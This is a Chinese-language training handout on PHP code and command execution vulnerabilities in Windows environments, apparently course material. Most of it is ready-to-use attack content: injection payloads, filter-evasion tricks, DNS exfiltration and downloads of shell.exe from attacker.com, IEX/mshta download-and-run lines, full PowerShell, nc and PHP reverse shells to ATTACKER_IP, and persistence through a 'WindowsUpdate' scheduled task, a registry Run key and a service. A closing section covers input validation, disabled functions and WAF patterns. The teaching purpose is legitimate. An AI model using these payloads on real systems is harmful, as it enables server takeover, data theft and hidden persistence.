# 命令和代码执行漏洞

## 第一部分：代码执行函数（1.5小时）

### 1.1 什么是代码执行漏洞

代码执行漏洞是指攻击者可以控制应用程序执行任意代码的安全漏洞。在PHP中，某些函数可以将字符串作为PHP代码执行，如果这些函数的参数可被用户控制，就会产生代码执行漏洞。

**危害：**
- 执行任意PHP代码
- 获取服务器权限
- 读取、修改、删除文件
- 控制整个Web应用

### 1.2 eval() 函数

`eval()` 是最危险的PHP函数之一，它将字符串作为PHP代码执行。

**函数原型：**
```php
eval(string $code): mixed
```

**漏洞示例：**
```php
<?php
// 危险代码
$code = $_GET['code'];
eval($code);
?>
```

**攻击载荷（Windows）：**
```
?code=phpinfo();
?code=system('whoami');
?code=system('dir');
?code=file_get_contents('C:\\Windows\\system.ini');
```

**注意事��：**
- eval() 不需要 `<?php ?>` 标签
- 语句必须以分号结束
- eval() 是语言结构，不是函数，无法被禁用（只能在编码时避免）

### 1.3 assert() 函数

`assert()` 用于调试，在PHP 7之前可以执行字符串代码。

**函数原型：**
```php
assert(mixed $assertion, string $description = ?): bool
```

**漏洞示例（PHP < 7.2）：**
```php
<?php
$code = $_GET['code'];
assert($code);
?>
```

**攻击载荷（Windows）：**
```
?code=phpinfo()
?code=system('whoami')
?code=system('dir')
```

**版本差异：**
- PHP 5: assert() 可以执行字符串代码
- PHP 7.0-7.1: 仍可执行，但有警告
- PHP 7.2+: 不再支持字符串执行

### 1.4 call_user_func() 函数

动态调用函数，第一个参数是函数名，后续参数是函数的参数。

**函数原型：**
```php
call_user_func(callable $callback, mixed ...$args): mixed
```

**漏洞示例：**
```php
<?php
$func = $_GET['func'];
$arg = $_GET['arg'];
call_user_func($func, $arg);
?>
```

**攻击载荷（Windows）：**
```
?func=system&arg=whoami
?func=passthru&arg=dir
?func=system&arg=ipconfig
?func=assert&arg=phpinfo()
```

**相关函数：**
- `call_user_func_array()`: 参数以数组形式传递
```php
call_user_func_array('system', array('whoami'));
```

### 1.5 create_function() 函数

动态创建匿名函数（PHP 7.2+ 已废弃）。

**函数原型：**
```php
create_function(string $args, string $code): string
```

**漏洞示例：**
```php
<?php
$func = create_function('', $_GET['code']);
$func();
?>
```

**攻击载荷（Windows）：**
```
?code=phpinfo();
?code=system('whoami');
?code=system('dir');
```

**注入技巧：**
create_function 实际上是用 eval 实现的，可以闭合函数：
```
?code=}phpinfo();//
```

### 1.6 array_map() 函数

对数组的每个元素应用回调函数。

**函数原型：**
```php
array_map(?callable $callback, array $array, array ...$arrays): array
```

**漏洞示例：**
```php
<?php
$func = $_GET['func'];
$arg = $_GET['arg'];
array_map($func, array($arg));
?>
```

**攻击载荷（Windows）：**
```
?func=system&arg=whoami
?func=system&arg=dir
?func=assert&arg=phpinfo()
```

**类似函数：**
- `array_filter()`: 过滤数组元素
- `usort()`: 自定义排序
- `uasort()`: 保持索引关��的排序

### 1.7 代码执行函数对比

| 函数 | PHP版��� | 是否需要分号 | 危险等级 | 备注 |
|------|---------|--------------|----------|------|
| eval() | 所有版本 | 是 | ⚠️⚠️⚠️⚠️⚠️ | 最危险，语言结构 |
| assert() | <7.2可执行字符串 | 否 | ⚠️⚠️⚠️⚠️ | 新版本已限制 |
| call_user_func() | 所有版本 | - | ⚠️⚠️⚠️ | 需要配合危险函数 |
| create_function() | <7.2 | 是 | ⚠️⚠��⚠️⚠️ | 已废弃 |
| array_map() | 所有版本 | - | ⚠️⚠️⚠️ | 需要配合危险函数 |

---

## 第二部分：命令执行函数（1.5小时）

### 2.1 什么是命令执行漏洞

命令执行漏洞是指攻击者可以在服务器上执行任意系统命令的安全漏洞。与代码执行不同，命令执行是调用操作系统的命令。

**危害：**
- 执行任意系统命令
- 读取、修改、删除系统文件
- 反弹shell获取完整控制权
- 横向移动攻击内网

### 2.2 system() 函数

执行外部程序并显示输出。

**函数原型：**
```php
system(string $command, int &$result_code = null): string|false
```

**特点：**
- 自动输出命令结果
- 返回最后一行输出
- 常用于需要立即看到结果的场景

**漏洞示例：**
```php
<?php
$cmd = $_GET['cmd'];
system($cmd);
?>
```

**攻击载荷（Windows）：**
```
?cmd=whoami
?cmd=dir
?cmd=ipconfig
?cmd=systeminfo
?cmd=net user
?cmd=type C:\Windows\system.ini
```

### 2.3 passthru() 函数

执行外部程序并显示原始输出（包括二进制）。

**函数原型：**
```php
passthru(string $command, int &$result_code = null): ?false
```

**特点：**
- 直接输出原始数据
- 适合输出二进制文件
- 无返回值（或返回false）

**漏洞示例：**
```php
<?php
passthru($_GET['cmd']);
?>
```

**攻击载荷（Windows）：**
```
?cmd=whoami
?cmd=dir
?cmd=type C:\Windows\win.ini
```

### 2.4 exec() 函数

执行外部程序，但不直接输出。

**函数原型：**
```php
exec(string $command, array &$output = null, int &$result_code = null): string|false
```

**特点：**
- 不自动输出
- 返回最后一行
- 可通过第二个参数获取所有输出

**漏洞示例：**
```php
<?php
$output = array();
exec($_GET['cmd'], $output);
print_r($output);
?>
```

**对比 system()：**
```php
// system: 直接输出
system("dir");

// exec: 需要手动输出
exec("dir", $output);
echo implode("\n", $output);
```

### 2.5 shell_exec() 函数

通过shell执行命令并返回完整输出。

**函数原型：**
```php
shell_exec(string $command): string|false|null
```

**特点：**
- 返回完整输出字符串
- 反引号 ` `` ` 是它的别名
- 不直接显示输出

**漏洞示例：**
```php
<?php
$output = shell_exec($_GET['cmd']);
echo $output;
?>
```

**反引号用法：**
```php
<?php
// 等价于 shell_exec()
$output = `whoami`;
echo $output;
?>
```

### 2.6 popen() 函数

打开一个指向进程的管道，可以读写。

**函数原型：**
```php
popen(string $command, string $mode): resource|false
```

**特点：**
- 返回文件指针
- 可以持续读取输出
- 需要手动关闭

**漏洞示例：**
```php
<?php
$handle = popen($_GET['cmd'], 'r');
while (!feof($handle)) {
    echo fread($handle, 1024);
}
pclose($handle);
?>
```

### 2.7 pcntl_exec() 函数

执行程序（进程控制扩展）。

**函数原型：**
```php
pcntl_exec(string $path, array $args = [], array $envs = []): bool
```

**特点：**
- 需要 pcntl 扩展
- 执行后当前进程被替换
- 较少遇到
- Windows不支持pcntl扩展

### 2.8 命令执行函数对比

| 函数 | 是否输出 | 返回值 | 常见度 | Windows支持 |
|------|----------|--------|--------|------------|
| system() | 是 | 最后一行 | ⭐⭐⭐⭐⭐ | ✅ |
| passthru() | 是（原始） | 无 | ⭐⭐⭐ | ✅ |
| exec() | 否 | 最后一行 | ⭐⭐⭐⭐ | ✅ |
| shell_exec() | 否 | 完整输出 | ⭐⭐⭐⭐⭐ | ✅ |
| popen() | 否 | 文件指针 | ⭐⭐ | ✅ |
| pcntl_exec() | 否 | 布尔 | ⭐ | ❌ |

### 2.9 反引号执行

反引号是 `shell_exec()` 的快捷方式。

**示例：**
```php
<?php
echo `whoami`;
echo `dir`;
?>
```

**在字符串中使用：**
```php
<?php
$user = `whoami`;
echo "Current user: $user";
?>
```

---

## 第三部分：注入方式与实战（2.5小时）

### 3.1 Windows命令连接符

#### 3.1.1 &符号

顺序执行多个命令，前一个命令失败不影响后续命令。

**语法：**
```cmd
command1 & command2
```

**示例：**
```cmd
whoami & dir
cd C:\Windows & dir
```

**PHP注入：**
```php
<?php
system("ping -n 1 " . $_GET['ip']);
?>
```
**攻击载荷：**
```
?ip=127.0.0.1&whoami
?ip=127.0.0.1&dir
?ip=127.0.0.1&ipconfig
```

#### 3.1.2 管道符 (|)

将前一个命令的输出作为后一个命令的输入。

**语法：**
```cmd
command1 | command2
```

**示例：**
```cmd
dir | findstr "php"
type C:\Windows\system.ini | findstr "drivers"
```

**攻击载荷：**
```
?ip=127.0.0.1|whoami
?ip=anything|dir
```

#### 3.1.3 逻辑与 (&&)

前一个命令成功后才执行后一个命令。

**语法：**
```cmd
command1 && command2
```

**示例：**
```cmd
cd C:\Windows && dir
mkdir test && cd test
```

**攻击载荷：**
```
?ip=127.0.0.1&&whoami
?ip=127.0.0.1&&dir
?ip=127.0.0.1&&ipconfig
```

#### 3.1.4 逻辑或 (||)

前一个命令失败后才执行后一个命令。

**语法：**
```cmd
command1 || command2
```

**示例：**
```cmd
ping -n 1 invalid_host || echo failed
```

**攻击载荷：**
```
?ip=invalid||whoami
?ip=xxx||dir
```

#### 3.1.5 换行符 (%0a)

换行符可以分隔命令。

**攻击载荷：**
```
?ip=127.0.0.1%0awhoami
?ip=127.0.0.1%0adir
```

### 3.2 Windows命令注释符

#### 3.2.1 REM

批处理文件的注释命令。

**使用场景：**
```php
system("ping -n 1 " . $_GET['ip'] . " > nul");
```

**攻击载荷：**
```
?ip=127.0.0.1&whoami REM
// 实际执行: ping -n 1 127.0.0.1&whoami REM > nul
```

#### 3.2.2 双冒号 (::)

批处理的标签注释。

**示例：**
```cmd
:: 这是注释
whoami
```

#### 3.2.3 续行符 (^)

连接多行命令。

**示例：**
```cmd
dir ^
C:\Windows
```

### 3.3 命令替换

#### 3.3.1 百分号变量 (%)

在批处理中使用变量。

**示例：**
```cmd
set USER=admin
echo %USER%
```

#### 3.3.2 for命令

循环执行命令。

**示例：**
```cmd
for /f %i in ('whoami') do echo %i
```

### 3.4 实战注入场景（Windows环境）

#### 场景1：Ping功能

```php
<?php
$ip = $_GET['ip'];
system("ping -n 4 " . $ip);
?>
```

**注入方式：**
- &符号: `?ip=127.0.0.1&whoami`
- 管道: `?ip=127.0.0.1|whoami`
- 逻辑与: `?ip=127.0.0.1&&whoami`

#### 场景2：文件查看

```php
<?php
$file = $_GET['file'];
system("type " . $file);
?>
```

**注入方式：**
```
?file=C:\Windows\system.ini&whoami
?file=test.txt||whoami
```

#### 场景3：日志查看

```php
<?php
$date = $_GET['date'];
system("type C:\\logs\\access_" . $date . ".log");
?>
```

**注入方式：**
```
?date=2024-01-01&whoami REM
?date=x||dir REM
```

#### 场景4：域名查询

```php
<?php
$domain = $_GET['domain'];
exec("nslookup " . $domain, $output);
print_r($output);
?>
```

**注入方式：**
```
?domain=example.com&whoami
?domain=x&&net user
```

### 3.5 Windows常用命令

| 命令 | 功能 | 示例 |
|------|------|------|
| whoami | 查看当前用户 | `whoami` |
| dir | 列出文件 | `dir C:\` |
| cd | 查看/切换目录 | `cd` |
| type | 读取文件 | `type C:\Windows\system.ini` |
| ipconfig | 网络配置 | `ipconfig /all` |
| systeminfo | 系统信息 | `systeminfo` |
| net user | 用户管理 | `net user` |
| net localgroup | 组管理 | `net localgroup administrators` |
| tasklist | 进程列表 | `tasklist` |
| netstat | ��络连接 | `netstat -ano` |

---

## 第四部分：绕过技巧（2.5小时）

### 4.1 空格绕过

Windows环境下的空格绕过方法：

#### 4.1.1 Tab键 (%09)

使用制表符代替空格。

**绕过方式：**
```
?cmd=type%09C:\Windows\system.ini
?cmd=dir%09C:\
```

#### 4.1.2 $IFS (PowerShell)

在PowerShell中可以使用。

**示例：**
```powershell
Get-Content$IFS"C:\Windows\system.ini"
```

#### 4.1.3 逗号（在某些情况）

**示例：**
```cmd
dir,C:\
```

### 4.2 关键字过滤绕过

#### 4.2.1 大小写混合

Windows命令不区分大小写。

**绕过方式：**
```cmd
WhOaMi
SyStEmInFo
IpCoNfIg
DiR
TyPe C:\Windows\system.ini
```

#### 4.2.2 环境变量

使用Windows环境变量。

**示例：**
```cmd
%COMSPEC%  # cmd.exe
%WINDIR%   # C:\Windows
%TEMP%     # 临时目录
%USERNAME% # 当前用户名

# 使用示例
echo %USERNAME%
dir %WINDIR%
%COMSPEC% /c whoami
```

#### 4.2.3 通配符

**星号 (*)：**
```cmd
dir C:\Win*
type C:\Windows\sys*.ini
```

**问号 (?)：**
```cmd
dir C:\Window?
type C:\Windows\system.in?
```

#### 4.2.4 引号绕过

```cmd
w""hoami
d""ir
sy""steminfo
t""ype C:\Windows\system.ini
```

#### 4.2.5 路径拼接

```cmd
C:\Windows\System32\whoami.exe
C:\Windows\System32\cmd.exe /c dir
```

### 4.3 读取文件的绕过

#### 4.3.1 type命令替代

**使用more：**
```cmd
more C:\Windows\system.ini
```

**使用PowerShell：**
```cmd
powershell Get-Content C:\Windows\system.ini
powershell cat C:\Windows\system.ini
powershell gc C:\Windows\system.ini
```

**使用findstr：**
```cmd
findstr .* C:\Windows\system.ini
```

**使用certutil：**
```cmd
certutil -encodehex C:\Windows\system.ini output.txt
```

### 4.4 命令执行的特殊姿势

#### 4.4.1 无回显时的盲注

**时间盲注：**
```cmd
ping -n 10 127.0.0.1
timeout /t 10
```

**DNS外带（Windows）：**
```cmd
nslookup %USERNAME%.attacker.com
ping %USERNAME%.attacker.com
```

**文件写入：**
```cmd
whoami > C:\inetpub\wwwroot\result.txt
dir > output.txt
```

#### 4.4.2 PowerShell下载文件

```cmd
powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\Temp\shell.exe"
powershell -c "IWR http://attacker.com/shell.exe -O C:\Temp\shell.exe"
```

#### 4.4.3 使用certutil下载

```cmd
certutil -urlcache -split -f http://attacker.com/shell.exe C:\Temp\shell.exe
```

### 4.5 编码绕过

#### 4.5.1 Base64编码（PowerShell）

```powershell
# 编码
$bytes = [System.Text.Encoding]::Unicode.GetBytes("whoami")
$encoded = [Convert]::ToBase64String($bytes)

# 执行Base64编码的命令
powershell -EncodedCommand <BASE64_STRING>
```

#### 4.5.2 URL编码

```
%77%68%6f%61%6d%69 = whoami
%64%69%72 = dir
```

### 4.6 综合绕过案例（Windows）

#### 案例1：过滤空格和type

**原命令：**
```cmd
type C:\Windows\system.ini
```

**绕过：**
```cmd
# 方法1: Tab
type%09C:\Windows\system.ini

# 方法2: 替代命令
more C:\Windows\system.ini

# 方法3: PowerShell
powershell cat C:\Windows\system.ini

# 方法4: findstr
findstr .* C:\Windows\system.ini
```

#### 案例2：过滤whoami

**绕过：**
```cmd
# 方法1: 大小写
WhOaMi

# 方法2: 环境变量
echo %USERNAME%

# 方法3: 完整路径
C:\Windows\System32\whoami.exe

# 方法4: 引号
w""hoami

# 方法5: PowerShell
powershell $env:USERNAME
```

#### 案例3：黑名单绕过

**被过滤: whoami, dir, type, net**

**绕过：**
```cmd
# whoami替代
echo %USERNAME%
set USERNAME

# dir替代
powershell ls
powershell Get-ChildItem

# type替代
more filename
findstr .* filename
powershell cat filename

# net user替代
wmic useraccount list brief
query user
```

---

## 第五部分：Shell监听与反弹（1小时）

### 5.1 什么是Shell监听

Shell监听是指攻击者在获取命令执行权限后，通过网络连接获取目标服务器的交互式Shell。

**常见方式：**
- 正向Shell：目标机器监听端口，攻击者连接
- 反弹Shell：攻击者监听端口，目标机器连接（更常用，可绕过防火墙）

### 5.2 nc (netcat) 基础

**Windows下获取netcat：**
- 下载ncat（Nmap自带）
- 下载传统netcat for Windows

#### 5.2.1 nc 基本用法

**监听端口：**
```cmd
ncat -lvp 4444
# 或
nc -lvp 4444
```

**连接到主机：**
```cmd
nc target_ip 4444
```

### 5.3 Windows反弹Shell

#### 5.3.1 PowerShell反弹Shell

**攻击者监听（Kali Linux）：**
```bash
nc -lvp 4444
```

**目标机器执行（Windows PowerShell）：**
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**精简版：**
```powershell
powershell -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"
```

#### 5.3.2 nc.exe反弹Shell

**如果目标有nc.exe：**
```cmd
nc.exe -e cmd.exe ATTACKER_IP 4444
```

#### 5.3.3 PHP反弹Shell（Windows）

```php
php -r "$sock=fsockopen('ATTACKER_IP',4444);$proc=proc_open('cmd.exe', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"
```

### 5.4 PowerShell下载并执行

```powershell
# 下载并执行
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"

# 简化版
powershell -c "IEX(IWR 'http://attacker.com/shell.ps1' -UseBasicParsing)"
```

### 5.5 使用mshta

```cmd
mshta http://attacker.com/payload.hta
```

### 5.6 实战技巧（Windows环境）

#### 5.6.1 绕过防火墙

使用常见端口（80, 443, 53, 8080）：
```powershell
powershell反弹到443端口
```

#### 5.6.2 Base64编码绕过

```powershell
# 将PowerShell命令Base64编码
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# 执行
powershell -EncodedCommand $encoded
```

#### 5.6.3 使用计划任务持久化

```cmd
schtasks /create /tn "WindowsUpdate" /tr "powershell -c <REVERSE_SHELL>" /sc minute /mo 1
```

### 5.7 Windows常用后门技术

#### 5.7.1 注册表自启动

```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\shell.exe"
```

#### 5.7.2 服务创建

```cmd
sc create "WindowsUpdate" binPath= "C:\shell.exe" start= auto
sc start "WindowsUpdate"
```

---

## 第六部分：防御措施（1小时）

### 6.1 输入验证

#### 6.1.1 白名单验证

只允许预期的输入格式。

**示例：IP地址验证**
```php
<?php
$ip = $_GET['ip'];

// 验证IP格式
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // 使用escapeshellarg进行额外保护
    $safe_ip = escapeshellarg($ip);
    system("ping -n 4 $safe_ip");
} else {
    die("Invalid IP address");
}
?>
```

**示例：文件名白名单**
```php
<?php
$allowed_files = ['system.ini', 'win.ini'];
$file = $_GET['file'];

if (in_array($file, $allowed_files)) {
    $output = shell_exec("type C:\\Windows\\$file");
    echo "<pre>$output</pre>";
} else {
    die("File not allowed");
}
?>
```

### 6.2 使用安全函数

#### 6.2.1 escapeshellarg()

转义命令参数。

**作用：**
- 在参数周围加引号
- 转义特殊字符

**示例：**
```php
<?php
$file = $_GET['file'];
$safe_file = escapeshellarg($file);
system("type $safe_file");
?>
```

#### 6.2.2 escapeshellcmd()

转义整个命令字符串。

**转义字符：**
```
& | ; ` < > ( ) $ \ \x0A \xFF ' "
```

**示例：**
```php
<?php
$cmd = escapeshellcmd($_GET['cmd']);
system($cmd);
?>
```

**注意：** `escapeshellcmd()` 和 `escapeshellarg()` 同时使用可能导致漏洞！

### 6.3 避免使用危险函数

#### 6.3.1 禁用危险函数

在 `php.ini` 中禁用：
```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec
```

#### 6.3.2 使用安全替代方案

**不要这样：**
```php
<?php
$ip = $_GET['ip'];
system("ping -n 4 $ip");
?>
```

**应该这样：**
```php
<?php
// 使用PHP原生函数
$ip = $_GET['ip'];
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    // 使用fsockopen等PHP函数，而不是系统命令
    $fp = @fsockopen($ip, 80, $errno, $errstr, 5);
    if ($fp) {
        echo "Host is reachable";
        fclose($fp);
    } else {
        echo "Host is not reachable";
    }
}
?>
```

### 6.4 Windows服务器加固

#### 6.4.1 IIS用户权限

- 使用低权限账户运行IIS（IIS_IUSRS）
- 限制用户可执行的命令
- 禁用不必要的功能

#### 6.4.2 文件权限

```cmd
# 配置文件只读
icacls config.php /grant IIS_IUSRS:R

# Web目录权限控制
icacls C:\inetpub\wwwroot /inheritance:r
```

#### 6.4.3 禁用危险功能

- 禁用PowerShell（如果不需要）
- 限制cmd.exe访问
- 启用AppLocker

### 6.5 代码执行防御

#### 6.5.1 避免使用eval()

**不要这样：**
```php
<?php
eval($_GET['code']);
?>
```

**应该这样：**
- 完全避免使用 eval()
- 如果必须动态执行，使用白名单机制

### 6.6 WAF（Web应用防火墙）

#### 6.6.1 检测模式

- 特征匹配：检测 `& | && ||` 等符号
- 行为分析：检测异常命令执行模式
- 语义分析：理解命令含义

#### 6.6.2 常见WAF规则

```
# 检测Windows命令注入
DetectPattern: (&|\||&&|\|\||;|%0a|whoami|ipconfig|net user)

# 检测PowerShell
DetectPattern: (powershell|iex|downloadstring)
```

### 6.7 日志与监控

#### 6.7.1 记录敏感操作

```php
<?php
// 记录所有命令执行尝试
function log_command($cmd, $user_ip) {
    $log = date('Y-m-d H:i:s') . " - $user_ip - $cmd\n";
    file_put_contents('C:\\logs\\command_exec.log', $log, FILE_APPEND);
}

$cmd = $_GET['cmd'];
log_command($cmd, $_SERVER['REMOTE_ADDR']);
?>
```

#### 6.7.2 Windows日志监控

- 监控事件查看器
- 使用Sysmon监控进程创建
- PowerShell日志记录

### 6.8 安全开发最佳实践

#### 6.8.1 代码审查清单

- [ ] 是否使用了 eval(), assert(), system() 等危险函数？
- [ ] 用户输入是否经过验证？
- [ ] 是否使用了白名单验证？
- [ ] 是否使用了 escapeshellarg() 或 escapeshellcmd()？
- [ ] 是否可以用PHP原生函数替代系统命令？
- [ ] 错误信息是否泄露敏感信息？

#### 6.8.2 安全编码示例（Windows环境）

**完整的安全实现：**
```php
<?php
// 安全的ping功能实现

// 1. 验证IP格式
$ip = $_GET['ip'] ?? '';

if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die(json_encode(['error' => 'Invalid IP address']));
}

// 2. 白名单检查（如果需要限制IP范围）
$allowed_ranges = ['192.168.1.0/24', '10.0.0.0/8'];
// ... IP范围检查逻辑 ...

// 3. 使用escapeshellarg保护参数
$safe_ip = escapeshellarg($ip);

// 4. Windows命令
$cmd = "ping -n 4 $safe_ip 2>&1";

// 5. 执行并记录
$output = [];
$return_code = 0;
exec($cmd, $output, $return_code);

// 6. 记录日志
$log_entry = sprintf(
    "[%s] IP: %s, User: %s, Result: %d\n",
    date('Y-m-d H:i:s'),
    $ip,
    $_SERVER['REMOTE_ADDR'],
    $return_code
);
file_put_contents('C:\\logs\\ping_audit.log', $log_entry, FILE_APPEND);

// 7. 安全输出（过滤敏感信息）
$safe_output = array_map('htmlspecialchars', $output);
echo json_encode([
    'status' => $return_code === 0 ? 'success' : 'failed',
    'output' => $safe_output
]);
?>
```

### 6.9 防御总结

| 防御层面 | 具体措施 | 优先级 |
|---------|---------|--------|
| 输入验证 | 白名单、正则表达式 | ⭐⭐⭐⭐⭐ |
| 函数使用 | escapeshellarg/cmd | ⭐⭐⭐⭐ |
| 代码设计 | 避免危险函数 | ⭐⭐⭐⭐⭐ |
| 系统配置 | disable_functions | ⭐⭐⭐⭐ |
| 权限控制 | 最小权限 | ⭐⭐⭐⭐ |
| WAF | 规则匹配 | ⭐⭐⭐ |
| 监控审计 | 日志记录 | ⭐⭐⭐ |

---

## 课程总结

### 重点回顾（Windows环境）

1. **代码执行函数：** eval, assert, call_user_func, create_function, array_map
2. **命令执行函数：** system, passthru, exec, shell_exec, popen
3. **注入符号：** `&` `|` `&&` `||` `%0a`
4. **绕过技巧：** Tab(%09)、大小写混合、环境变量、PowerShell
5. **反弹Shell：** PowerShell、nc.exe、PHP等方式
6. **防御核心：** 输入验证 + 避免危险函数 + 最小权限

### Windows特有注意事项

1. **路径问题**
   - 使用反斜杠 `\` 或双反斜杠 `\\`
   - 路径中的空格需要引号保护

2. **命令差异**
   - `dir` 代替 `ls`
   - `type` 代替 `cat`
   - `whoami` 两系统通用
   - PowerShell是强大的工具

3. **权限问题**
   - IIS运行在IIS_IUSRS权限下
   - UAC可能影响某些操作
   - 需要管理员权限的命令受限

### 实验练习建议

1. 完成所有靶场关卡
2. 尝试不同的Windows命令
3. 练习PowerShell反弹Shell（在虚拟环境中）
4. 编写安全的命令执行代码
5. 了解Windows日志监控

### 进阶学习（Windows方向）

- PowerShell攻防
- Windows权限提升
- 域渗透技术
- Windows后门技术
- AMSI绕过
- Defender绕过

### 常用Windows命令速查

```cmd
# 信息收集
whoami /all           # 详细用户信息
systeminfo            # 系统信息
ipconfig /all         # 网络配置
net user              # 本地用户
net localgroup administrators  # 管理员组
tasklist              # 进程列表
netstat -ano          # 网络连接

# 文件操作
dir /s /b            # 递归列出文件
type filename        # 读取文件
findstr /s /i "password" *.*  # 搜索密码

# 网络
ping -n 4 IP         # Ping 4次
tracert domain       # 路由跟踪
nslookup domain      # DNS查询

# 权限
whoami /priv         # 查看权限
icacls filename      # 查看文件权限
```
